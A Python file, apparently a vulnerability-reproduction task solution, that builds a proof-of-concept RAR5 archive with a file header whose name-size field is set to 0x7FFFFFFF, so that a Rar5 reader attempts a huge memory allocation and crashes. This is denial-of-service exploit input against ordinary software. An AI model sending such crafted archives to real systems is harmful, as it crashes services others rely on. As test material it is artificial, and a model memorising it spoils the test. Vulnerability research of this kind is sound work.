import sys
import os

class Solution:
    def _encode_vint(self, n: int) -> bytes:
        """
        Encodes an integer into the RAR5 variable-length integer format.
        """
        if n == 0:
            return b'\x00'
        
        res = bytearray()
        while n > 0:
            byte = n & 0x7f
            n >>= 7
            if n > 0:
                byte |= 0x80
            res.append(byte)
        return bytes(res)

    def solve(self, src_path: str) -> bytes:
        """
        Generates a PoC that triggers the vulnerability.

        The vulnerability is an excessive memory allocation in the Rar5 reader.
        The PoC is a minimal RAR5 archive containing a file header with a very
        large 'name size' field. This causes the vulnerable code to attempt a
        huge memory allocation, leading to a crash in a memory-constrained
        environment.

        Args:
            src_path: Path to the vulnerable source code tarball (unused).

        Returns:
            bytes: The PoC input that should trigger the vulnerability.
        """
        # 1. RAR5 signature
        poc = bytearray(b'Rar!\x1a\x07\x01\x00')

        # 2. Minimal Main Archive Header
        # HEAD_TYPE = 1 (Main Archive), HEAD_FLAGS = 0
        main_header_content = self._encode_vint(1) + self._encode_vint(0)
        main_header_size = self._encode_vint(len(main_header_content))
        poc.extend(main_header_size)
        poc.extend(main_header_content)

        # 3. Vulnerable File Header
        # This block will contain the oversized name length field.
        file_fields = bytearray()
        # Preceding fields, set to 0
        file_fields.extend(self._encode_vint(0))  # file_flags
        file_fields.extend(self._encode_vint(0))  # unpacked_size
        file_fields.extend(self._encode_vint(0))  # file_attributes
        file_fields.extend(self._encode_vint(0))  # compression_information
        file_fields.extend(self._encode_vint(0))  # host_os

        # The vulnerable field: a very large name size.
        # 0x7FFFFFFF (2GB - 1) is large enough to cause malloc to fail.
        large_name_size = 0x7FFFFFFF
        file_fields.extend(self._encode_vint(large_name_size))
        
        # Assemble the file header block
        # HEAD_TYPE = 2 (File Header), HEAD_FLAGS = 0
        file_header_content = self._encode_vint(2) + self._encode_vint(0) + file_fields
        file_header_size = self._encode_vint(len(file_header_content))
        
        poc.extend(file_header_size)
        poc.extend(file_header_content)

        return bytes(poc)
